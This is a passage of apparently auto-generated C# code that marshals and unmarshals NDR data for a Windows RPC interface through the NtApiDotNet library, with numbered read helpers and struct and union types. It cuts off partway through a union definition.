public char[] Read_97()\n        {\n            return ReadConformantArray<char>();\n        }\n        public char[] Read_98()\n        {\n            return ReadConformantArray<char>();\n        }\n        public char[] Read_99()\n        {\n            return ReadConformantArray<char>();\n        }\n        public char[] Read_100()\n        {\n            return ReadConformantArray<char>();\n        }\n        public Struct_45[] Read_101()\n        {\n            return ReadConformantStructArray<Struct_45>();\n        }\n        public short[] Read_102()\n        {\n            return ReadConformantArray<short>();\n        }\n        public Struct_47[] Read_103()\n        {\n            return ReadConformantStructArray<Struct_47>();\n        }\n        public int[] Read_104()\n        {\n            return ReadFixedPrimitiveArray<int>(2);\n        }\n        public char[] Read_105()\n        {\n            return ReadConformantArray<char>();\n        }\n        public Struct_69[] Read_106()\n        {\n            return ReadConformantStructArray<Struct_69>();\n        }\n        public Struct_74[] Read_107()\n        {\n            return ReadConformantStructArray<Struct_74>();\n        }\n        public string Read_108()\n        {\n            return ReadFixedString(260);\n        }\n        public Struct_83[] Read_109()\n        {\n            return ReadConformantStructArray<Struct_83>();\n        }\n        public int[] Read_110()\n        {\n            return ReadConformantArray<int>();\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrUnsupported Read_111()\n        {\n            return ReadUnsupported(\"FC_CVARRAY - FC_CVARRAY\");\n        }\n        public Struct_89[] Read_112()\n        {\n            return ReadConformantStructArray<Struct_89>();\n        }\n        public sbyte[] Read_113()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_114()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_115()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_116()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_117()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_118()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_119()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_120()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_121()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public char[] Read_122()\n        {\n            return ReadConformantArray<char>();\n        }\n        public sbyte[] Read_123()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_124()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_125()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_126()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_127()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public char[] Read_128()\n        {\n            return ReadConformantArray<char>();\n        }\n        public char[] Read_129()\n        {\n            return ReadConformantArray<char>();\n        }\n        public Struct_78[] Read_130()\n        {\n            return ReadConformantStructArray<Struct_78>();\n        }\n        public char[] Read_131()\n        {\n            return ReadConformantArray<char>();\n        }\n        public char[] Read_132()\n        {\n            return ReadConformantArray<char>();\n        }\n        public char[] Read_133()\n        {\n            return ReadConformantArray<char>();\n        }\n        public Struct_87[] Read_134()\n        {\n            return ReadConformantStructArray<Struct_87>();\n        }\n    }\n    #endregion\n    #region Complex Types\n    public struct Struct_0 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<sbyte[], long>(Member8, new System.Action<sbyte[], long>(m.Write_95), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<sbyte[]>(new System.Func<sbyte[]>(u.Read_95), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<sbyte[]> Member8;\n        public static Struct_0 CreateDefault()\n        {\n            return new Struct_0();\n        }\n        public Struct_0(int Member0, sbyte[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_1 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_2(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_2();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_2 Member8;\n        public static Struct_1 CreateDefault()\n        {\n            return new Struct_1();\n        }\n        public Struct_1(int Member0, Union_2 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_2 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 1))\n            {\n                m.WriteEmbeddedPointer<Struct_3>(Arm_1, new System.Action<Struct_3>(m.Write_3));\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                m.WriteEmbeddedPointer<Struct_5>(Arm_2, new System.Action<Struct_5>(m.Write_5));\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                m.WriteEmbeddedPointer<Struct_6>(Arm_3, new System.Action<Struct_6>(m.Write_6));\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                m.WriteEmbeddedPointer<Struct_7>(Arm_4, new System.Action<Struct_7>(m.Write_7));\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_2\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadEmbeddedPointer<Struct_3>(new System.Func<Struct_3>(u.Read_3), false);\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                Arm_2 = u.ReadEmbeddedPointer<Struct_5>(new System.Func<Struct_5>(u.Read_5), false);\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                Arm_3 = u.ReadEmbeddedPointer<Struct_6>(new System.Func<Struct_6>(u.Read_6), false);\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                Arm_4 = u.ReadEmbeddedPointer<Struct_7>(new System.Func<Struct_7>(u.Read_7), false);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_2\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_3> Arm_1;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_5> Arm_2;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_6> Arm_3;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_7> Arm_4;\n        public static Union_2 CreateDefault()\n        {\n            return new Union_2();\n        }\n        public Union_2(uint Selector, System.Nullable<Struct_3> Arm_1, System.Nullable<Struct_5> Arm_2, System.Nullable<Struct_6> Arm_3, System.Nullable<Struct_7> Arm_4)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n            this.Arm_2 = Arm_2;\n            this.Arm_3 = Arm_3;\n            this.Arm_4 = Arm_4;\n        }\n    }\n    public struct Struct_3 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member20, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member28, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member30, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member38);\n            m.WriteInt32(Member3C);\n            m.WriteInt32(Member40);\n            m.WriteInt32(Member44);\n            m.WriteInt32(Member48);\n            m.Write_4(Member4C);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member20 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member28 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member30 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member38 = u.ReadInt32();\n            Member3C = u.ReadInt32();\n            Member40 = u.ReadInt32();\n            Member44 = u.ReadInt32();\n            Member48 = u.ReadInt32();\n            Member4C = u.Read_4();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member20;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member28;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member30;\n        public int Member38;\n        public int Member3C;\n        public int Member40;\n        public int Member44;\n        public int Member48;\n        public Struct_4 Member4C;\n        public static Struct_3 CreateDefault()\n        {\n            return new Struct_3();\n        }\n        public Struct_3(int Member0, string Member8, string Member10, string Member18, string Member20, string Member28, string Member30, int Member38, int Member3C, int Member40, int Member44, int Member48, Struct_4 Member4C)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member28 = Member28;\n            this.Member30 = Member30;\n            this.Member38 = Member38;\n            this.Member3C = Member3C;\n            this.Member40 = Member40;\n            this.Member44 = Member44;\n            this.Member48 = Member48;\n            this.Member4C = Member4C;\n        }\n    }\n    public struct Struct_4 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt16(Member0);\n            m.WriteInt16(Member2);\n            m.WriteInt16(Member4);\n            m.WriteInt16(Member6);\n            m.WriteInt16(Member8);\n            m.WriteInt16(MemberA);\n            m.WriteInt16(MemberC);\n            m.WriteInt16(MemberE);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt16();\n            Member2 = u.ReadInt16();\n            Member4 = u.ReadInt16();\n            Member6 = u.ReadInt16();\n            Member8 = u.ReadInt16();\n            MemberA = u.ReadInt16();\n            MemberC = u.ReadInt16();\n            MemberE = u.ReadInt16();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 2;\n        }\n        public short Member0;\n        public short Member2;\n        public short Member4;\n        public short Member6;\n        public short Member8;\n        public short MemberA;\n        public short MemberC;\n        public short MemberE;\n        public static Struct_4 CreateDefault()\n        {\n            return new Struct_4();\n        }\n        public Struct_4(short Member0, short Member2, short Member4, short Member6, short Member8, short MemberA, short MemberC, short MemberE)\n        {\n            this.Member0 = Member0;\n            this.Member2 = Member2;\n            this.Member4 = Member4;\n            this.Member6 = Member6;\n            this.Member8 = Member8;\n            this.MemberA = MemberA;\n            this.MemberC = MemberC;\n            this.MemberE = MemberE;\n        }\n    }\n    public struct Struct_5 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member20, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member28, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member30, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member38, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member40, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member48, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteUInt3264(Member50);\n            m.WriteEmbeddedPointer<string>(Member58, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteUInt3264(Member60);\n            m.WriteInt32(Member68);\n            m.WriteInt32(Member6C);\n            m.WriteInt32(Member70);\n            m.WriteInt32(Member74);\n            m.WriteInt32(Member78);\n            m.WriteInt32(Member7C);\n            m.WriteInt32(Member80);\n            m.Write_4(Member84);\n            m.WriteInt32(Member94);\n            m.WriteInt32(Member98);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member20 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member28 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member30 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member38 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member40 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member48 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member50 = u.ReadUInt3264();\n            Member58 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member60 = u.ReadUInt3264();\n            Member68 = u.ReadInt32();\n            Member6C = u.ReadInt32();\n            Member70 = u.ReadInt32();\n            Member74 = u.ReadInt32();\n            Member78 = u.ReadInt32();\n            Member7C = u.ReadInt32();\n            Member80 = u.ReadInt32();\n            Member84 = u.Read_4();\n            Member94 = u.ReadInt32();\n            Member98 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member20;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member28;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member30;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member38;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member40;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member48;\n        public NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member50;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member58;\n        public NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member60;\n        public int Member68;\n        public int Member6C;\n        public int Member70;\n        public int Member74;\n        public int Member78;\n        public int Member7C;\n        public int Member80;\n        public Struct_4 Member84;\n        public int Member94;\n        public int Member98;\n        public static Struct_5 CreateDefault()\n        {\n            return new Struct_5();\n        }\n        public Struct_5(\n                    int Member0, \n                    string Member8, \n                    string Member10, \n                    string Member18, \n                    string Member20, \n                    string Member28, \n                    string Member30, \n                    string Member38, \n                    string Member40, \n                    string Member48, \n                    NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member50, \n                    string Member58, \n                    NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member60, \n                    int Member68, \n                    int Member6C, \n                    int Member70, \n                    int Member74, \n                    int Member78, \n                    int Member7C, \n                    int Member80, \n                    Struct_4 Member84, \n                    int Member94, \n                    int Member98)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member28 = Member28;\n            this.Member30 = Member30;\n            this.Member38 = Member38;\n            this.Member40 = Member40;\n            this.Member48 = Member48;\n            this.Member50 = Member50;\n            this.Member58 = Member58;\n            this.Member60 = Member60;\n            this.Member68 = Member68;\n            this.Member6C = Member6C;\n            this.Member70 = Member70;\n            this.Member74 = Member74;\n            this.Member78 = Member78;\n            this.Member7C = Member7C;\n            this.Member80 = Member80;\n            this.Member84 = Member84;\n            this.Member94 = Member94;\n            this.Member98 = Member98;\n        }\n    }\n    public struct Struct_6 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteInt32(Member4);\n            m.WriteInt32(Member8);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member4 = u.ReadInt32();\n            Member8 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public int Member4;\n        public int Member8;\n        public static Struct_6 CreateDefault()\n        {\n            return new Struct_6();\n        }\n        public Struct_6(int Member0, int Member4, int Member8)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_7 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member20, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member28, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member30, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member38, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member40, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member48, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteUInt3264(Member50);\n            m.WriteEmbeddedPointer<string>(Member58, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteUInt3264(Member60);\n            m.WriteInt32(Member68);\n            m.WriteInt32(Member6C);\n            m.WriteInt32(Member70);\n            m.WriteInt32(Member74);\n            m.WriteInt32(Member78);\n            m.WriteInt32(Member7C);\n            m.WriteInt32(Member80);\n            m.Write_4(Member84);\n            m.WriteInt32(Member94);\n            m.WriteInt32(Member98);\n            m.WriteInt32(Member9C);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member20 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member28 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member30 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member38 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member40 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member48 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member50 = u.ReadUInt3264();\n            Member58 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member60 = u.ReadUInt3264();\n            Member68 = u.ReadInt32();\n            Member6C = u.ReadInt32();\n            Member70 = u.ReadInt32();\n            Member74 = u.ReadInt32();\n            Member78 = u.ReadInt32();\n            Member7C = u.ReadInt32();\n            Member80 = u.ReadInt32();\n            Member84 = u.Read_4();\n            Member94 = u.ReadInt32();\n            Member98 = u.ReadInt32();\n            Member9C = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member20;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member28;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member30;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member38;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member40;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member48;\n        public NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member50;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member58;\n        public NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member60;\n        public int Member68;\n        public int Member6C;\n        public int Member70;\n        public int Member74;\n        public int Member78;\n        public int Member7C;\n        public int Member80;\n        public Struct_4 Member84;\n        public int Member94;\n        public int Member98;\n        public int Member9C;\n        public static Struct_7 CreateDefault()\n        {\n            return new Struct_7();\n        }\n        public Struct_7(\n                    int Member0, \n                    string Member8, \n                    string Member10, \n                    string Member18, \n                    string Member20, \n                    string Member28, \n                    string Member30, \n                    string Member38, \n                    string Member40, \n                    string Member48, \n                    NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member50, \n                    string Member58, \n                    NtApiDotNet.Ndr.Marshal.NdrUInt3264 Member60, \n                    int Member68, \n                    int Member6C, \n                    int Member70, \n                    int Member74, \n                    int Member78, \n                    int Member7C, \n                    int Member80, \n                    Struct_4 Member84, \n                    int Member94, \n                    int Member98, \n                    int Member9C)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member28 = Member28;\n            this.Member30 = Member30;\n            this.Member38 = Member38;\n            this.Member40 = Member40;\n            this.Member48 = Member48;\n            this.Member50 = Member50;\n            this.Member58 = Member58;\n            this.Member60 = Member60;\n            this.Member68 = Member68;\n            this.Member6C = Member6C;\n            this.Member70 = Member70;\n            this.Member74 = Member74;\n            this.Member78 = Member78;\n            this.Member7C = Member7C;\n            this.Member80 = Member80;\n            this.Member84 = Member84;\n            this.Member94 = Member94;\n            this.Member98 = Member98;\n            this.Member9C = Member9C;\n        }\n    }\n    public struct Struct_8 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_9(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_9();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_9 Member8;\n        public static Struct_8 CreateDefault()\n        {\n            return new Struct_8();\n        }\n        public Struct_8(int Member0, Union_9 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_9 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 0))\n            {\n                m.WriteEmbeddedPointer<Struct_10>(Arm_0, new System.Action<Struct_10>(m.Write_10));\n                goto done;\n            }\n            if ((Selector == 1))\n            {\n                m.WriteEmbeddedPointer<Struct_11>(Arm_1, new System.Action<Struct_11>(m.Write_11));\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                m.WriteEmbeddedPointer<Struct_12>(Arm_2, new System.Action<Struct_12>(m.Write_12));\n                